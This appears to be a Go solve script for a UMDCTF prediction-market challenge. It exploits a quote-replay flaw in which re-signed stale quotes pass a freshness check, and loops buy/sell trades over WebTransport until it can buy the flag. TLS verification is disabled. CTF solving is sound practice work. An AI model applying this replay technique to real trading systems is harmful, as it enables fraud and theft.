// Solve script for the UMDCTF prediction-market challenge.
//
// The bug: the RESEND endpoint (0x26) returns a quote with an old price but
// stamps it with the *current* server seq and re-signs it. Because the TRADE
// handler checks freshness against token.Seq, the resent token passes the
// freshness check even though the price inside is historical. That lets us
// buy at old cheap prices (or sell at old rich prices) whenever the current
// market has drifted in our favor.
//
// Flow:
//   1. Register a fresh account, log in.
//   2. Subscribe to a ticker and collect live (seq, price) datagrams until
//      the resend-window tape is populated.
//   3. Pick the old quote in the tape with the biggest gap to current price.
//      If current > old, RESEND the old quote and BUY_YES at the cheap price,
//      then after cooldown SELL_YES at a fresh current quote.
//      If current < old, do the mirror-image trade using BUY_NO / SELL_NO.
//   4. Repeat until balance >= flag price (10,000,000 = $1,000.00).
//   5. Submit BUY_FLAG and print the flag.
//
// Usage:
//   go run . -url https://HOST:4443/wt
//
// Notes:
//   - TLS verification is disabled: the CTF server presents a self-signed
//     cert whose hash is normally distributed to browsers via the frontend
//     bundle. For a terminal solver we just skip verification.
//   - WebTransport requires HTTP/3; we use quic-go/webtransport-go.

package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"os"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
	"github.com/quic-go/webtransport-go"
)

// --- Wire protocol (mirrors server/internal/protocol) -----------------------

const (
	reqRegister     byte = 0x20
	reqLogin        byte = 0x21
	reqSubscribe    byte = 0x22
	reqFetchTickers byte = 0x24
	reqResend       byte = 0x26
	reqTrade        byte = 0x30
	reqPortfolio    byte = 0x40
	reqBuyFlag      byte = 0x50

	statusOK byte = 0x00

	sideBuyYes  byte = 0x00
	sideBuyNo   byte = 0x01
	sideSellYes byte = 0x02
	sideSellNo  byte = 0x03

	datagramQuote  byte = 0x01
	quoteHMACSize       = 8
	quoteDatagramSz     = 7 + quoteHMACSize

	priceUnit       uint32 = 10000
	flagPrice       uint64 = 10_000_000
	minCooldownSecs        = 5 // MinCooldown (50 ticks) at 100ms tick = 5s

	// Prices within this distance of either boundary are rejected by the
	// server (resolution band). We skip those opportunities client-side so
	// we don't waste cycles on trades the server will refuse.
	minTradablePrice uint16 = 51
	maxTradablePrice uint16 = 9949
)

// --- Small binary helpers ---------------------------------------------------

func putU16(b []byte, v uint16) { binary.LittleEndian.PutUint16(b, v) }
func putU32(b []byte, v uint32) { binary.LittleEndian.PutUint32(b, v) }
func getU16(b []byte) uint16    { return binary.LittleEndian.Uint16(b) }
func getU64(b []byte) uint64    { return binary.LittleEndian.Uint64(b) }

// --- Client ----------------------------------------------------------------

type quoteToken struct {
	Seq      uint16
	Ticker   uint16
	Price    uint16
	HMAC     []byte // 8 bytes
	observed time.Time
}

type client struct {
	sess *webtransport.Session

	mu         sync.Mutex
	latest     map[uint16]quoteToken   // most recent token per ticker
	tape       map[uint16][]quoteToken // observed history per ticker
	tapeLimit  int
}

func dial(ctx context.Context, url string) (*webtransport.Session, error) {
	d := &webtransport.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{http3.NextProtoH3},
		},
		QUICConfig: &quic.Config{
			EnableDatagrams:                    true,
			EnableStreamResetPartialDelivery:   true,
			MaxIdleTimeout:                     30 * time.Second,
		},
	}
	_, sess, err := d.Dial(ctx, url, nil)
	if err != nil {
		return nil, fmt.Errorf("webtransport dial: %w", err)
	}
	return sess, nil
}

func newClient(sess *webtransport.Session) *client {
	return &client{
		sess:      sess,
		latest:    make(map[uint16]quoteToken),
		tape:      make(map[uint16][]quoteToken),
		tapeLimit: 600, // more than ResendTapeSize (500) so we always carry one extra
	}
}

// request opens a bidi stream, writes the payload, reads the full response.
func (c *client) request(ctx context.Context, payload []byte) ([]byte, error) {
	stream, err := c.sess.OpenStreamSync(ctx)
	if err != nil {
		return nil, fmt.Errorf("open stream: %w", err)
	}
	if _, err := stream.Write(payload); err != nil {
		return nil, fmt.Errorf("write: %w", err)
	}
	if err := stream.Close(); err != nil {
		return nil, fmt.Errorf("close write: %w", err)
	}
	buf, err := io.ReadAll(stream)
	if err != nil {
		return nil, fmt.Errorf("read: %w", err)
	}
	if len(buf) == 0 {
		return nil, errors.New("empty response")
	}
	if buf[0] != statusOK {
		msg := ""
		if len(buf) >= 3 {
			n := int(getU16(buf[1:3]))
			if 3+n <= len(buf) {
				msg = string(buf[3 : 3+n])
			}
		}
		return nil, fmt.Errorf("server error 0x%02x: %s", buf[0], msg)
	}
	return buf[1:], nil
}

// datagramLoop keeps parsing incoming QUOTE datagrams into c.latest/c.tape.
func (c *client) datagramLoop(ctx context.Context) {
	for {
		data, err := c.sess.ReceiveDatagram(ctx)
		if err != nil {
			return
		}
		if len(data) != quoteDatagramSz || data[0] != datagramQuote {
			continue
		}
		seq := getU16(data[1:3])
		tid := getU16(data[3:5])
		price := getU16(data[5:7])
		mac := make([]byte, quoteHMACSize)
		copy(mac, data[7:7+quoteHMACSize])

		tok := quoteToken{
			Seq:      seq,
			Ticker:   tid,
			Price:    price,
			HMAC:     mac,
			observed: time.Now(),
		}

		c.mu.Lock()
		c.latest[tid] = tok
		tp := append(c.tape[tid], tok)
		if len(tp) > c.tapeLimit {
			tp = tp[len(tp)-c.tapeLimit:]
		}
		c.tape[tid] = tp
		c.mu.Unlock()
	}
}

func (c *client) register(ctx context.Context, user, pass string) error {
	pl := append([]byte{reqRegister}, lenPrefix(user)...)
	pl = append(pl, lenPrefix(pass)...)
	_, err := c.request(ctx, pl)
	return err
}

func (c *client) login(ctx context.Context, user, pass string) (uint64, error) {
	pl := append([]byte{reqLogin}, lenPrefix(user)...)
	pl = append(pl, lenPrefix(pass)...)
	resp, err := c.request(ctx, pl)
	if err != nil {
		return 0, err
	}
	if len(resp) < 8 {
		return 0, errors.New("short login response")
	}
	return getU64(resp[0:8]), nil
}

func (c *client) fetchTickers(ctx context.Context) ([]uint16, error) {
	resp, err := c.request(ctx, []byte{reqFetchTickers})
	if err != nil {
		return nil, err
	}
	if len(resp) < 2 {
		return nil, errors.New("short tickers response")
	}
	n := getU16(resp[0:2])
	off := 2
	ids := make([]uint16, 0, n)
	for i := uint16(0); i < n; i++ {
		if off+2 > len(resp) {
			return nil, errors.New("truncated ticker list")
		}
		ids = append(ids, getU16(resp[off:off+2]))
		off += 2
		if off >= len(resp) {
			return nil, errors.New("truncated ticker name len")
		}
		nameLen := int(resp[off])
		off += 1 + nameLen
		if off+2 > len(resp) {
			return nil, errors.New("truncated ticker desc len")
		}
		descLen := int(getU16(resp[off : off+2]))
		off += 2 + descLen
	}
	return ids, nil
}

func (c *client) subscribe(ctx context.Context, ticker uint16) error {
	pl := []byte{reqSubscribe, 0, 0}
	putU16(pl[1:], ticker)
	_, err := c.request(ctx, pl)
	return err
}

func (c *client) resend(ctx context.Context, seq, ticker uint16) (quoteToken, error) {
	pl := make([]byte, 5)
	pl[0] = reqResend
	putU16(pl[1:3], seq)
	putU16(pl[3:5], ticker)
	resp, err := c.request(ctx, pl)
	if err != nil {
		return quoteToken{}, err
	}
	if len(resp) != 6+quoteHMACSize {
		return quoteToken{}, fmt.Errorf("bad resend response length %d", len(resp))
	}
	mac := make([]byte, quoteHMACSize)
	copy(mac, resp[6:6+quoteHMACSize])
	return quoteToken{
		Seq:    getU16(resp[0:2]),
		Ticker: getU16(resp[2:4]),
		Price:  getU16(resp[4:6]),
		HMAC:   mac,
	}, nil
}

type tradeResult struct {
	FillPrice  uint16
	NewBalance uint64
}

func (c *client) trade(ctx context.Context, tok quoteToken, side byte, qty uint32) (tradeResult, error) {
	pl := make([]byte, 0, 1+2+2+2+quoteHMACSize+1+4)
	pl = append(pl, reqTrade)
	pl = appendU16(pl, tok.Seq)
	pl = appendU16(pl, tok.Ticker)
	pl = appendU16(pl, tok.Price)
	pl = append(pl, tok.HMAC...)
	pl = append(pl, side)
	pl = appendU32(pl, qty)
	resp, err := c.request(ctx, pl)
	if err != nil {
		return tradeResult{}, err
	}
	if len(resp) < 10 {
		return tradeResult{}, errors.New("short trade response")
	}
	return tradeResult{
		FillPrice:  getU16(resp[0:2]),
		NewBalance: getU64(resp[2:10]),
	}, nil
}

func (c *client) buyFlag(ctx context.Context) (string, error) {
	resp, err := c.request(ctx, []byte{reqBuyFlag})
	if err != nil {
		return "", err
	}
	if len(resp) < 2 {
		return "", errors.New("short flag response")
	}
	n := getU16(resp[0:2])
	if int(2+n) > len(resp) {
		return "", errors.New("truncated flag")
	}
	return string(resp[2 : 2+n]), nil
}

// --- Strategy --------------------------------------------------------------

type opportunity struct {
	ticker      uint16
	old         quoteToken
	currentYes  uint16
	buySide     byte // sideBuyYes or sideBuyNo
	sellSide    byte // sideSellYes or sideSellNo
	buyPrice    uint16
	sellEstUpr  uint16 // best estimate of what we'll sell at (current)
	spread      int32  // sell - buy (positive = profit)
}

// resendWindowTicks is the server-side ResendTapeSize (500 ticks at 100ms =
// 50s). We prune our observation tape just under that so we don't hand the
// server a seq whose slot has been overwritten.
const resendWindow = 45 * time.Second

// findOpportunity scans the tape for the most profitable resend+round-trip.
// Observations older than resendWindow are dropped — their slots have been
// overwritten server-side, so RESEND would fail.
//
// For a BUY_YES exploit we want to resend a quote whose YES price is far
// below the current YES price. For a BUY_NO exploit we want the opposite
// (resend a quote where YES was very *high*, i.e., NO was very low).
func (c *client) findOpportunity() (opportunity, bool) {
	c.mu.Lock()
	defer c.mu.Unlock()

	now := time.Now()
	var best opportunity
	found := false

	for tid, latest := range c.latest {
		history := c.tape[tid]
		// Prune to observations still within the server's resend window.
		cutoff := now.Add(-resendWindow)
		i := 0
		for i < len(history) && history[i].observed.Before(cutoff) {
			i++
		}
		if i > 0 {
			history = history[i:]
			c.tape[tid] = history
		}
		if len(history) == 0 {
			continue
		}
		currentYes := latest.Price

		// Sell leg only fills if the fresh quote is itself in-band. Skip
		// tickers whose current price is outside the tradable range.
		if currentYes < minTradablePrice || currentYes > maxTradablePrice {
			continue
		}

		// BUY_YES at the lowest historical YES price that is still in-band.
		var lo quoteToken
		lo.Price = 0xFFFF
		for _, h := range history {
			if h.Price < minTradablePrice || h.Price > maxTradablePrice {
				continue
			}
			if h.Price < lo.Price {
				lo = h
			}
		}
		if lo.Price != 0xFFFF && int32(currentYes)-int32(lo.Price) > 0 {
			spread := int32(currentYes) - int32(lo.Price)
			if !found || spread > best.spread {
				best = opportunity{
					ticker:     tid,
					old:        lo,
					currentYes: currentYes,
					buySide:    sideBuyYes,
					sellSide:   sideSellYes,
					buyPrice:   lo.Price,
					sellEstUpr: currentYes,
					spread:     spread,
				}
				found = true
			}
		}

		// BUY_NO at (PriceUnit - highest historical YES).
		var hi quoteToken
		for _, h := range history {
			if h.Price < minTradablePrice || h.Price > maxTradablePrice {
				continue
			}
			if h.Price > hi.Price {
				hi = h
			}
		}
		// no-price at hi = PriceUnit - hi.Price  (the cheap leg)
		// no-price now  = PriceUnit - currentYes (the rich leg)
		// profit per contract = (PriceUnit - currentYes) - (PriceUnit - hi.Price)
		//                     = hi.Price - currentYes
		if hi.Price != 0 && int32(hi.Price)-int32(currentYes) > 0 {
			spread := int32(hi.Price) - int32(currentYes)
			if !found || spread > best.spread {
				best = opportunity{
					ticker:     tid,
					old:        hi,
					currentYes: currentYes,
					buySide:    sideBuyNo,
					sellSide:   sideSellNo,
					buyPrice:   uint16(priceUnit) - hi.Price,
					sellEstUpr: uint16(priceUnit) - currentYes,
					spread:     spread,
				}
				found = true
			}
		}
	}
	return best, found
}

// --- Credential generation -------------------------------------------------

func randomCreds() (string, string) {
	var ubuf [6]byte
	_, _ = rand.Read(ubuf[:])
	user := "solver" + hex.EncodeToString(ubuf[:]) // 6 + 12 = 18 chars, alphanumeric

	// Password needs upper, lower, digit, special, and length >= 12.
	var pbuf [8]byte
	_, _ = rand.Read(pbuf[:])
	pass := "Solver!" + hex.EncodeToString(pbuf[:]) // "Solver!" (upper+lower+special) + 16 hex (digits+letters) = 23 chars
	return user, pass
}

// --- Binary helpers --------------------------------------------------------

func lenPrefix(s string) []byte {
	if len(s) > 255 {
		panic("lenPrefix: string too long")
	}
	out := make([]byte, 1+len(s))
	out[0] = byte(len(s))
	copy(out[1:], s)
	return out
}

func appendU16(b []byte, v uint16) []byte {
	var tmp [2]byte
	putU16(tmp[:], v)
	return append(b, tmp[:]...)
}

func appendU32(b []byte, v uint32) []byte {
	var tmp [4]byte
	putU32(tmp[:], v)
	return append(b, tmp[:]...)
}

// --- Main ------------------------------------------------------------------

func main() {
	url := flag.String("url", "", "WebTransport endpoint, e.g. https://localhost:4443/wt")
	warmup := flag.Duration("warmup", 55*time.Second, "how long to collect live quotes before exploiting")
	maxCycles := flag.Int("max-cycles", 400, "safety bound on exploit cycles")
	flag.Parse()

	if *url == "" {
		fmt.Fprintln(os.Stderr, "usage: go run . -url https://HOST:4443/wt")
		os.Exit(2)
	}

	_ = mrand.New(mrand.NewSource(time.Now().UnixNano()))

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	log.Printf("dialing %s …", *url)
	sess, err := dial(ctx, *url)
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	defer sess.CloseWithError(0, "done")
	c := newClient(sess)

	user, pass := randomCreds()
	log.Printf("registering user %q", user)
	if err := c.register(ctx, user, pass); err != nil {
		log.Fatalf("register: %v", err)
	}
	bal, err := c.login(ctx, user, pass)
	if err != nil {
		log.Fatalf("login: %v", err)
	}
	log.Printf("logged in, balance=%d", bal)

	tickers, err := c.fetchTickers(ctx)
	if err != nil {
		log.Fatalf("fetch tickers: %v", err)
	}
	log.Printf("subscribing to %d tickers", len(tickers))
	for _, tid := range tickers {
		if err := c.subscribe(ctx, tid); err != nil {
			log.Fatalf("subscribe %d: %v", tid, err)
		}
	}

	// Start datagram reader.
	go c.datagramLoop(ctx)

	log.Printf("warming up for %s to populate the resend tape …", *warmup)
	time.Sleep(*warmup)

	balance := bal
	for cycle := 1; cycle <= *maxCycles; cycle++ {
		if balance >= flagPrice {
			break
		}
		op, ok := c.findOpportunity()
		if !ok {
			log.Printf("[cycle %d] no profitable opportunity yet; waiting for a fresher market", cycle)
			time.Sleep(2 * time.Second)
			continue
		}

		// Size the position to use ~90% of balance (leaving headroom for rounding).
		if op.buyPrice == 0 {
			op.buyPrice = 1
		}
		maxQty := uint32((balance * 9 / 10) / uint64(op.buyPrice))
		if maxQty == 0 {
			log.Printf("[cycle %d] balance too small for any qty (balance=%d, buyPrice=%d)", cycle, balance, op.buyPrice)
			break
		}

		log.Printf("[cycle %d] ticker=%d  resend seq=%d old_yes=%d  current_yes=%d  side=%s  qty=%d  expected_spread≈%d/unit",
			cycle, op.ticker, op.old.Seq, op.old.Price, op.currentYes, sideName(op.buySide), maxQty, op.spread)

		// --- Leg 1: resend old quote and buy at the historical price.
		oldTok, err := c.resend(ctx, op.old.Seq, op.ticker)
		if err != nil {
			log.Printf("  resend failed: %v — retrying next cycle", err)
			time.Sleep(1 * time.Second)
			continue
		}
		// Sanity: the resent token should carry the same price we expect.
		if oldTok.Price != op.old.Price {
			log.Printf("  resent token price=%d diverged from observed %d; using it anyway", oldTok.Price, op.old.Price)
		}
		buyRes, err := c.trade(ctx, oldTok, op.buySide, maxQty)
		if err != nil {
			log.Printf("  buy leg failed: %v — retrying next cycle", err)
			time.Sleep(1 * time.Second)
			continue
		}
		log.Printf("  bought %d @ %d  balance=%d", maxQty, buyRes.FillPrice, buyRes.NewBalance)
		balance = buyRes.NewBalance

		// --- Wait out cooldown (+ a small buffer for clock drift).
		time.Sleep(time.Duration(minCooldownSecs+1) * time.Second)

		// --- Leg 2: sell at the freshest token currently available.
		c.mu.Lock()
		fresh, have := c.latest[op.ticker]
		c.mu.Unlock()
		if !have {
			log.Printf("  no fresh quote available to sell against; waiting 1s")
			time.Sleep(1 * time.Second)
			continue
		}
		sellRes, err := c.trade(ctx, fresh, op.sellSide, maxQty)
		if err != nil {
			log.Printf("  sell leg failed: %v", err)
			// Leave the position — next cycle may still improve; but don't loop
			// forever on a persistent error.
			time.Sleep(1 * time.Second)
			continue
		}
		// Profit accounting: balance here still reflects post-buy balance.
		// net = (sell_revenue) - (buy_cost) = new - (old - buy_cost) - 0.
		// Easier: just report newBalance - prevBalance across the round-trip.
		preBuyBal := balance + uint64(buyRes.FillPrice)*uint64(maxQty)
		log.Printf("  sold   %d @ %d  balance=%d  (Δ=%+d)", maxQty, sellRes.FillPrice, sellRes.NewBalance, int64(sellRes.NewBalance)-int64(preBuyBal))
		balance = sellRes.NewBalance

		// Wait out cooldown before the next buy-leg attempt.
		time.Sleep(time.Duration(minCooldownSecs+1) * time.Second)
	}

	if balance < flagPrice {
		log.Fatalf("ran out of cycles before reaching flag price (balance=%d, need=%d)", balance, flagPrice)
	}

	log.Printf("balance %d ≥ flag price %d — buying flag", balance, flagPrice)
	flagStr, err := c.buyFlag(ctx)
	if err != nil {
		log.Fatalf("buy flag: %v", err)
	}
	fmt.Println(flagStr)
}

func sideName(s byte) string {
	switch s {
	case sideBuyYes:
		return "BUY_YES"
	case sideBuyNo:
		return "BUY_NO"
	case sideSellYes:
		return "SELL_YES"
	case sideSellNo:
		return "SELL_NO"
	default:
		return fmt.Sprintf("0x%02x", s)
	}
}
